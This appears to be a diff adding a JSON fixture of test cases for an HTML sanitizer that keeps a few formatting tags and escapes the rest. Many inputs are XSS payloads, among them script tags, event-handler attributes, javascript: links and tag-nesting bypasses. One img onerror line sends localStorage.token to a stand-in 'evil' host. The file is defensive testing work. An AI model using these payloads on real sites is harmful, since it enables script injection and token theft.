@@ -1,0 +1,136 @@
+[
+  {
+    "input": "Lo dice el texto: <i>one per week on average</i>. La <b>A</b> es al revés.",
+    "output": "Lo dice el texto: <i>one per week on average</i>. La <b>A</b> es al revés."
+  },
+  {
+    "input": "<strong>ojo</strong> y <em>matiz</em>",
+    "output": "<strong>ojo</strong> y <em>matiz</em>"
+  },
+  {
+    "input": "<script>alert(1)</script>",
+    "output": "&lt;script&gt;alert(1)&lt;/script&gt;"
+  },
+  {
+    "input": "<img src=x onerror=\"fetch('//evil/'+localStorage.token)\">",
+    "output": "&lt;img src=x onerror=&quot;fetch(&#39;//evil/&#39;+localStorage.token)&quot;&gt;"
+  },
+  {
+    "input": "<b onclick=\"alert(1)\">x</b>",
+    "output": "&lt;b onclick=&quot;alert(1)&quot;&gt;x</b>"
+  },
+  {
+    "input": "<i style=\"position:fixed\">x</i>",
+    "output": "&lt;i style=&quot;position:fixed&quot;&gt;x</i>"
+  },
+  {
+    "input": "<b/onmouseover=alert(1)>x</b>",
+    "output": "&lt;b/onmouseover=alert(1)&gt;x</b>"
+  },
+  {
+    "input": "<em >x</em>",
+    "output": "&lt;em &gt;x</em>"
+  },
+  {
+    "input": "<b\n>x</b>",
+    "output": "&lt;b\n&gt;x</b>"
+  },
+  {
+    "input": "<a href=\"javascript:alert(1)\">pulsa</a>",
+    "output": "&lt;a href=&quot;javascript:alert(1)&quot;&gt;pulsa&lt;/a&gt;"
+  },
+  {
+    "input": "<<b>script>alert(1)<</b>/script>",
+    "output": "&lt;<b>script&gt;alert(1)&lt;</b>/script&gt;"
+  },
+  {
+    "input": "<scr<b>ipt>alert(1)</scr</b>ipt>",
+    "output": "&lt;scr<b>ipt&gt;alert(1)&lt;/scr</b>ipt&gt;"
+  },
+  {
+    "input": "<b<script>alert(1)</script>>",
+    "output": "&lt;b&lt;script&gt;alert(1)&lt;/script&gt;&gt;"
+  },
+  {
+    "input": "<svg/onload=alert(1)",
+    "output": "&lt;svg/onload=alert(1)"
+  },
+  {
+    "input": "<iframe srcdoc='<script>1</script>'>",
+    "output": "&lt;iframe srcdoc=&#39;&lt;script&gt;1&lt;/script&gt;&#39;&gt;"
+  },
+  {
+    "input": "<B><I></I></B><ScRiPt>1</ScRiPt>",
+    "output": "<b><i></i></b>&lt;ScRiPt&gt;1&lt;/ScRiPt&gt;"
+  },
+  {
+    "input": "<B>x</B>",
+    "output": "<b>x</b>"
+  },
+  {
+    "input": "<STRONG>x</Strong>",
+    "output": "<strong>x</strong>"
+  },
+  {
+    "input": "Tom &amp; Jerry &lt;3 &#39;ok&#39; &#x27;",
+    "output": "Tom &amp; Jerry &lt;3 &#39;ok&#39; &#x27;"
+  },
+  {
+    "input": "R&D y a < b",
+    "output": "R&amp;D y a &lt; b"
+  },
+  {
+    "input": "\"comillas\" y 'apóstrofos'",
+    "output": "&quot;comillas&quot; y &#39;apóstrofos&#39;"
+  },
+  {
+    "input": "&lt;b&gt;literal&lt;/b&gt;",
+    "output": "&lt;b&gt;literal&lt;/b&gt;"
+  },
+  {
+    "input": "&lt;script&gt;",
+    "output": "&lt;script&gt;"
+  },
+  {
+    "input": "&#12345678; &#x1234567; &a; &aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; &aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;",
+    "output": "&amp;#12345678; &amp;#x1234567; &amp;a; &aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; &aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;"
+  },
+  {
+    "input": "&AMP; &Eacute; &#X27; &#xZZ;",
+    "output": "&AMP; &Eacute; &#X27; &amp;#xZZ;"
+  },
+  {
+    "input": "ñandú → 😀 <b>ü</b>",
+    "output": "ñandú → 😀 <b>ü</b>"
+  },
+  {
+    "input": "",
+    "output": ""
+  },
+  {
+    "input": "Mira <B>esto</B> & <script>alert(\"x\")</script> <i onclick=\"y\">z</i> &amp; it's",
+    "output": "Mira <b>esto</b> &amp; &lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; &lt;i onclick=&quot;y&quot;&gt;z</i> &amp; it&#39;s"
+  },
+  {
+    "input": null,
+    "output": ""
+  },
+  {
+    "input": 42,
+    "output": ""
+  },
+  {
+    "input": true,
+    "output": ""
+  },
+  {
+    "input": {},
+    "output": ""
+  },
+  {
+    "input": [
+      "<b>"
+    ],
+    "output": ""
+  }
+]
